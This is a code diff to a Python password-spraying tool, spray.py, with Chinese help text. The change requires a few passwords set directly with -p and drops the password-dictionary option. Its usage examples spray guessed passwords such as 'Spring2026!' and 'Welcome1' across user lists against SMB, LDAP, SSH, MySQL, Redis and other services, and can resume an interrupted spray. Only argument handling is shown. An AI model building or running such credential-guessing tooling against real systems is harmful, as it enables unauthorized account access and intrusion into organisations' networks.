@@ -386,13 +386,11 @@ def build_subparsers(subparsers):
         p.add_argument("-t", "--target", required=True,
                        help="目标 IP 或主机名")
         p.add_argument("-U", "--users", required=True,
-                       help="用户名字典文件，每行一个")
-        p.add_argument("-P", "--passwords", default=None,
-                       help="密码字典文件，每行一个")
-        p.add_argument("-p", "--password", action="append", default=None,
-                       help="直接指定单个密码（可多次使用）")
+                       help="用户列表文件，每行一个用户名")
+        p.add_argument("-p", "--password", action="append", required=True,
+                       help="要喷洒的密码（可多次使用指定多个），如 -p 'Spring2026!'")
         p.add_argument("--generate", action="append", default=None,
-                       help="密码生成模板（可多次使用），如 '{Season}{Year}{Special}'")
+                       help="密码生成模板（可多次使用），如 --generate '{Season}{Year}{Special}'")
         p.add_argument("--company", default="",
                        help="公司名，用于模板中的 {Company} 替换")
         p.add_argument("--year", type=int, default=None,
@@ -600,21 +598,14 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 示例 Examples:
-  spray.py smb   -t 192.168.1.10 -U users.txt -P passwords.txt -d corp.local
-  spray.py ldap  -t dc.corp.local -U users.txt -P passwords.txt --ssl
-  spray.py http  -t https://mail.corp.com -U users.txt -p Spring2025! -p Summer2025!
-  spray.py ssh   -t 192.168.1.10 -U users.txt --generate "{Season}{Year}{Special}"
-  spray.py winrm -t 192.168.1.10 -U users.txt -P base.txt -p Admin123!
-  spray.py telnet -t 192.168.1.10 -U users.txt -P passwords.txt
-  spray.py mysql -t 192.168.1.10 -U users.txt -P passwords.txt
-  spray.py postgresql -t 192.168.1.10 -U users.txt -P passwords.txt
-  spray.py mssql -t 192.168.1.10 -U users.txt -P passwords.txt
-  spray.py oracle -t 192.168.1.10 -U users.txt -P passwords.txt --sid ORCL
-  spray.py mongodb -t 192.168.1.10 -U users.txt -P passwords.txt --auth-db admin
-  spray.py redis -t 192.168.1.10 -P passwords.txt -p ""
+  spray.py smb   -t 192.168.1.10 -U users.txt -p 'Spring2026!'
+  spray.py ldap  -t dc.corp.local -U users.txt -p 'P@ssw0rd' --ssl
+  spray.py ssh   -t 192.168.1.10 -U users.txt -p 'Welcome1' -p 'Company1'
+  spray.py mysql -t 192.168.1.10 -U users.txt -p 'root' --generate '{Season}{Year}{Special}'
+  spray.py redis -t 192.168.1.10 -U users.txt -p ''
 
 恢复中断的喷洒:
-  spray.py smb -t 192.168.1.10 -U users.txt -P passwords.txt --state-file state.json --resume
+  spray.py smb -t 192.168.1.10 -U users.txt -p 'Spring2026!' --state-file state.json --resume
         """,
     )
 
@@ -640,18 +631,9 @@ def main():
 
     users = list(dict.fromkeys(users))
 
-    # -- 收集密码（多来源合并）------------------------------------------------
+    # -- 收集密码（喷洒模式：少量密码，大量用户）-------------------------------
     passwords = []
-
-    if args.passwords:
-        try:
-            passwords.extend(load_list(args.passwords))
-        except FileNotFoundError:
-            print(f"{Fore.RED}[!] 密码文件未找到: {args.passwords}")
-            sys.exit(1)
-
-    if args.password:
-        passwords.extend(args.password)
+    passwords.extend(args.password)
 
     if args.generate:
         try:
